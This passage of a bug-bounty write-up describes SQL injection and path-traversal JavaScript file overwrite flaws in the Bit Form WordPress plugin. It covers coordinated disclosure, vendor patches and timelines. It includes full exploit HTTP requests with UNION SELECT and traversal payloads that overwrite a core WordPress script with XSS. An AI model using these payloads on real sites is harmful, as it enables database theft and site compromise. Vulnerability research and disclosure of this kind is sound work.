![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240822222708.png)

Nice!! It worked!

### The Patch

In this SQL injection vulnerability, the patch should be fixing the wrong usage of class `Model` method `get`. However, the vendor decided to validate variable `$formID` and `$id` must be an integer only?

In version 2.13.10 [revision log](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=3136079%40bit-form%2Ftrunk&old=3133646%40bit-form%2Ftrunk&sfp_email=&sfph_mail=), we can see how the vendor validate those variables:

```php
class AdminFormHandler
{
  [...]
  public function duplicateAMailTemplate($Request, $post)
  {
    [...]
    if (false === filter_var($id, FILTER_VALIDATE_INT)) {
      return new WP_Error('empty_form', 'Invalid Email Template ID.');
    }

    if (false === filter_var($formID, FILTER_VALIDATE_INT)) {
      return new WP_Error('empty_form', 'Invalid Form ID.');
    }
    
    $emailTemplateHandler = new EmailTemplateHandler($formID);
    $duplicate_status = $emailTemplateHandler->duplicateTemplate($id);
    [...]
  }
```

I mean... That's also a different way to fix the vulnerability. ¯\_(ツ)_/¯

### Timeline

- Reported the vulnerabilities to Wordfence in July 18th, 2024 at 8:47 PM (UTC+8)
- Wordfence started the triage process in August 7th, 2024 at 10:05 PM (UTC+8)
- Wordfence assigned CVE ID "CVE-2024-7780" in August 13th, 2024 at 6:20 AM (UTC+8)
- Bit Form version 2.13.10 was released in August 15th, 2024
- Wordfence publicly disclosed the vulnerability in August 19th, 2024 at 11:06 PM (UTC+8)

## Authenticated (Administrator+) SQL Injection via getLogHistory Function (CVE-2024-7702)

Another SQL injection I've found was another **misused in the `Model` class query builder**. By searching the `execute` method from class `Model`, we can find method `geLogHistory` from `FormEntryLogModel`:

```php
class FormEntryLogModel extends Model
{
  [...]
  public function geLogHistory($form_id, $entry_id)
  {
    $sql = "SELECT * FROM `{$this->app_db->prefix}bitforms_form_entry_log` where form_entry_id=$entry_id AND form_id=$form_id order By created_at DESC";

    $logs = $this->execute($sql)->getResult();
    [...]
    $ids = [];
    foreach ($logs as $log) {
      $ids[] = $log->id;
    }
    if (isset($logs->errors['result_empty'])) {
      [...]
    } else {
      $allLogId = preg_replace('/"/', '', implode(',', $ids));
      $sql2 = "SELECT * FROM `{$this->app_db->prefix}bitforms_form_log_details` WHERE `log_id` IN ($allLogId)";
      $integrations = $this->execute($sql2)->getResult();
      [...]
    }
  }
```

As you can see in this method there are **2 SQL injection vulnerabilities**.

Instead of using the query builder to build a SQL query, **it parses a raw SQL query to method `execute`**. In the previous SQL injection vulnerability, I've mentioned that if method `execute` variable `$values` is `null`, it'll NOT prepare or escape the raw SQL query.

In this case, this method misused the method `execute`. **The correct way to use it is like this**:

```php
$sql = "SELECT * FROM `{$this->app_db->prefix}bitforms_form_entry_log` where form_entry_id=%d AND form_id=%d order By created_at DESC";
$values = [ "form_entry_id_here", "form_id_here" ];

$this->execute($sql, $values);
```

By tracing back the execution flow, we can see that class `AdminFormHandler` method `getLogHistory` uses that misused `execute` method:

```php
class AdminFormHandler
{
  [...]
  public function getLogHistory($Request, $post)
  {
    if (isset($Request['formID'])) {
      $formID = wp_unslash($Request['formID']);
      $entryID = wp_unslash($Request['entryID']);
    } else {
      $formID = wp_unslash($post->formID);
      $entryID = wp_unslash($post->entryID);
    }
    [...]
    $formManager = new AdminFormManager($formID);
    if (!$formManager->isExist()) {
      return new WP_Error('empty_form', __('Form does not exist.', 'bit-form'));
    }
    $formLogModel = new FormEntryLogModel();

    $log_history = $formLogModel->geLogHistory($formID, $entryID);
    return $log_history;
  }
```

Which is again used by class `AdminAjax` method `getLogHistory` and AJAX action `bitforms_form_log_history`:

```php
class AdminAjax
{
  public function register()
  {
    [...]
    add_action('wp_ajax_bitforms_form_log_history', [$this, 'getLogHistory']);
    [...]
  }
  public function getLogHistory()
  {
    if (wp_verify_nonce(sanitize_text_field($_REQUEST['_ajax_nonce']), 'bitforms_save')) {
      $inputJSON = file_get_contents('php://input');
      $input = json_decode($inputJSON);
      $formHandler = FormHandler::getInstance();
      $status = $formHandler->admin->getLogHistory($_REQUEST, $input);
      [...]
    } else {
      [...]
    }
  }
```

Therefore, AJAX action `bitforms_form_log_history` is vulnerable to SQL injection.

Let's try that!

Since we already created a form in the previous vulnerability demonstration, we can send the following POST request to exploit the SQL injection vulnerability:

```http
POST /wp-admin/admin-ajax.php?action=bitforms_form_log_history&_ajax_nonce=780bef0a26 HTTP/1.1
Host: localhost
Content-Type: text/plain;charset=UTF-8
Content-Length: 151
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=wordpress%7C1724553914%7C9pNaCWccoYSDyYoiSO4e07YnorNyXoFaKEF0H5QnZkX%7C58c18d2f8b6415954d2a339d57d57b3c1fe7bc913f22130d5780f0d2a85c49f9; wp-settings-time-1=1724390118; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=wordpress%7C1724553914%7C9pNaCWccoYSDyYoiSO4e07YnorNyXoFaKEF0H5QnZkX%7Cf943227a153b21afbc65dbd93c78032c2ad0055a49af9c5fedf5d1281404dbd7

{"formID":"1","entryID":"0 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,concat('Database user: ', user()),concat('MySQL version: ', @@version)-- -"}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240823133713.png)

Nice! It worked!

### The Patch

Again, to fix this vulnerability, the vendor could correct the misused `execute` method or validate the `formID` and `entryID` must be an integer. We can view version 2.13.10 [revision log](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=3136079%40bit-form%2Ftrunk&old=3133646%40bit-form%2Ftrunk&sfp_email=&sfph_mail=) for the implementation of the patch:

```php
class FormEntryLogModel extends Model
{
  [...]
  public function geLogHistory($form_id, $entry_id)
  {
    $sql = "SELECT * FROM `{$this->app_db->prefix}bitforms_form_entry_log` where form_entry_id=%d AND form_id=%d order By created_at DESC";
    $logs = $this->execute($sql, [$entry_id, $form_id])->getResult();
    [...]
    $ids = [];
    foreach ($logs as $log) {
      $ids[] = (int) $log->id;
    }
    if (isset($logs->errors['result_empty'])) {
      [...]
    } else {
      $allLogId = preg_replace('/"/', '', implode(',', $ids));
      $sql2 = "SELECT * FROM `{$this->app_db->prefix}bitforms_form_log_details` WHERE `log_id` IN ($allLogId)";
      $integrations = $this->execute($sql2)->getResult();
      [...]
    }
  }
```

### Timeline

- Reported the vulnerabilities to Wordfence in July 3rd, 2024 at 11:46 PM (UTC+8)
- Wordfence started the triage process in August 7th, 2024 at 10:27 PM (UTC+8)
- Wordfence assigned CVE ID "CVE-2024-7780" in August 13th, 2024 at 4:11 AM (UTC+8)
- Bit Form version 2.13.10 was released in August 15th, 2024
- Wordfence publicly disclosed the vulnerability in August 19th, 2024 at 11:17 PM (UTC+8)

## Authenticated (Administrator+) Arbitrary JavaScript File Uploads (CVE-2024-7775)

After finding many server-side vulnerabilities, it's time to find some client-side vulnerabilities!

As usual, I started searching for client-side vulnerabilities sinks. Some common sinks I'll be looking for are file upload related built-in PHP functions, such as `fwrite`, `file_put_contents`, `copy`, and more.

The reason I'll look for these sinks is that if it doesn't validate dangerous file types like `.svg`, `.js`, `.pdf`, it's possible to **overwrite/upload a file** that contains an XSS payload.

Indeed, we can find **method `saveFile` from class `Helpers`** is suspected to be vulnerable to the above scenario:

```php
class Helpers
{
  [...]
    /**
   * @method name : saveFile
   * @description : save js/css field to disk
   * @param  : $path => like(dirName/css), $fileName => main.css, $script
   * @return : boolean
   */
  public static function saveFile($path, $fileName, $script, $fileOpenMode = 'a')
  {
    try {
      $rootDir = BITFORMS_CONTENT_DIR . DIRECTORY_SEPARATOR;
      $path = trim($path, '/');
      $pathArr = explode('/', $path); // like "fieldname/user => [Fieldname, user]
      foreach ($pathArr as $d) {
        $rootDir .= $d . DIRECTORY_SEPARATOR;
        if (!realpath($rootDir)) {
          mkdir($rootDir);
        }
      }
      $fullPath = $rootDir . $fileName;
      $file = fopen($fullPath, $fileOpenMode);
      if (false === $file) {
        throw new Exception("Failed to open file: $fullPath");
      }
      if (false === fwrite($file, $script)) {
        throw new Exception("Failed to write to file: $fullPath");
      }
      if (false === fclose($file)) {
        throw new Exception("Failed to close file: $fullPath");
      }
      return true;
    } catch (\Exception $e) {
      [...]
    }
  }
```

As you can see, this helper method is to **save JavaScript or CSS files to disk**. Sounds very interesting!

If we search this method's usage, we can find this interesting method `customCodeFileSaveOrDelete` from class `FrontEndScriptGenerator`:

```php
class FrontEndScriptGenerator
{
  [...]
  public static function customCodeFileSaveOrDelete($script, $path, $fileName)
  {
    if ($script) {
      Helpers::saveFile($path, $fileName, $script, 'w');
    } else {
      [...]
    }
    return true;
  }
```

Which is called from method `customCodeFile`:

```php
class FrontEndScriptGenerator
{
  [...]
  public static function customCodeFile($formId, $customCodes)
  {
    // for js file
    $path = 'form-scripts';
    $fileName = "bitform-custom-$formId.js";
    self::customCodeFileSaveOrDelete($customCodes->JavaScript, $path, $fileName);

    // for css file
    $path = 'form-styles';
    $fileName = "bitform-custom-$formId.css";
    self::customCodeFileSaveOrDelete($customCodes->CSS, $path, $fileName);

    return true;
  }
```

Hmm... Based on the method name, it seems like we could create some custom JavaScript or CSS file.

By tracing back the execution flow, we can confirm that theory:

```php
class AdminAjax
{
  public function register()
  {
    [...]
    add_action('wp_ajax_bitforms_add_custom_code', [$this, 'addCustomCode']);
    [...]
  }
  public function addCustomCode()
  {
    if (wp_verify_nonce(sanitize_text_field($_REQUEST['_ajax_nonce']), 'bitforms_save')) {
      $inputJSON = file_get_contents('php://input');
      $input = json_decode($inputJSON);
      FrontEndScriptGenerator::customCodeFile($input->form_id, $input->customCodes);
      [...]
    } else {
      [...]
    }
  }
```

Throughout the entire execution flow, there's **no validation over the `form_id` and `customCodes`**. Therefore, we can overwrite or create arbitrary JavaScript and CSS files via path traversal in `form_id`.

Let's try to create an arbitrary JavaScript file at path `/var/www/html/` by sending the following POST request:

```http
POST /wp-admin/admin-ajax.php?action=bitforms_add_custom_code&_ajax_nonce=780bef0a26 HTTP/1.1
Host: localhost
Content-Type: text/plain;charset=UTF-8
Content-Length: 119
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=wordpress%7C1724553914%7C9pNaCWccoYSDyYoiSO4e07YnorNyXoFaKEF0H5QnZkX%7C58c18d2f8b6415954d2a339d57d57b3c1fe7bc913f22130d5780f0d2a85c49f9; wp-settings-time-1=1724390118; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=wordpress%7C1724553914%7C9pNaCWccoYSDyYoiSO4e07YnorNyXoFaKEF0H5QnZkX%7Cf943227a153b21afbc65dbd93c78032c2ad0055a49af9c5fedf5d1281404dbd7

{"form_id":"/../../../../../../../../../../../var/www/html/poc","customCodes":{"JavaScript":"alert(document.domain);"}}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240823141140.png)

```shell
┌[siunam♥Mercury]-(~/bug-bounty/Wordfence/PoC/bit-form/stored-xss)-[2024.08.23|14:10:24(HKT)]
└> curl http://localhost/poc.js
alert(document.domain);
```

Nice! It worked!

However, since this JavaScript is not imported anywhere, we'll need to overwrite a JavaScript file in order to trigger the XSS payload.

To find one, we can go to the admin dashboard and get 1 imported JavaScript file:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240823141351.png)

We can choose whatever JavaScript file is imported in here. In my case, I picked `/wp-includes/js/heartbeat.min.js`.

Now we can try to overwrite that JavaScript file with the following payload:

```json
{"form_id":"/../../../../../../../../../../../var/www/html/wp-includes/js/heartbeat.min","customCodes":{"JavaScript":"alert(document.domain);"}}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240823141539.png)

Then **hard refresh** (Ctrl + Shift + R) the admin dashboard page to import our XSS payload JavaScript file:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Bug-Bounty/Wordfence/how-i-found-my-first-vulnerabilities-in-6-different-wordpress-plugins-part-1/images/Pasted%20image%2020240823141717.png)

Nice, it worked!

> Note: The reason we need to hard refresh is that the original JavaScript file was **cached**.

### The Patch

To fix this vulnerability, the vendor needs to validate the `form_id` variable to be type integer only. We can view version 2.13.10 [revision log](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=3136079%40bit-form%2Ftrunk&old=3133646%40bit-form%2Ftrunk&sfp_email=&sfph_mail=) in details:

```php
class AdminAjax
{
  [...]
  public function addCustomCode()
  {
    if (wp_verify_nonce(sanitize_text_field($_REQUEST['_ajax_nonce']), 'bitforms_save')) {
      $inputJSON = file_get_contents('php://input');
      $input = json_decode($inputJSON);
      $formId = sanitize_text_field($input->form_id);
      if (filter_var($formId, FILTER_VALIDATE_INT)) {
        FrontEndScriptGenerator::customCodeFile($formId, $input->customCodes);
        [...]
      } else {
        [...]
      }
    } else {
      [...]
    }
  }
```

### Timeline

- Reported the vulnerabilities to Wordfence in July 18th, 2024 at 8:21 PM (UTC+8)
- Wordfence started the triage process in August 7th, 2024 at 10:07 PM (UTC+8)
- Wordfence assigned CVE ID "CVE-2024-7775" in August 13th, 2024 at 5:23 AM (UTC+8)
- Bit Form version 2.13.10 was released in August 15th, 2024
- Wordfence publicly disclosed the vulnerability in August 19th, 2024 at 11:16 PM (UTC+8)

## Conclusion

Ultimately, I found total of 7 vulnerabilities in this plugin. However, all of them require administrator+ privilege to be able to exploit the vulnerabilities, which means they're all out-of-scope. BUT! I didn't feel disappointed, matter of fact I actually felt very happy, because I found my first vulnerability in a real application outside from CTFs!

In the next part, I'll be talking about how I found multiple vulnerabilities in 5 different WordPress plugins that use the same PHP library. Stay tuned!